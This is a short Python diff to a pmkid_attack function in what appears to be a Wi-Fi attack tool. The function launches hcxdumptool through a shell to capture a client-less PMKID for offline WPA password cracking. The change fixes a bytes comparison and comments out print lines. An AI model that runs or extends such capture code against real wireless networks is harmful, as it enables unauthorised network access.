@@ -632,8 +632,9 @@ def pmkid_attack():
     p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
     while True:
         line = p.stdout.readline()
-        print(line, end=' ')
-        if 'FOUND PMKID CLIENT-LESS]' in line:
+        #print(1)
+        #print(line, end=' ')
+        if b'FOUND PMKID CLIENT-LESS]' in line:
             break
     os.killpg(os.getpgid(p.pid), signal.SIGTERM)
     print('[*] Complete!')
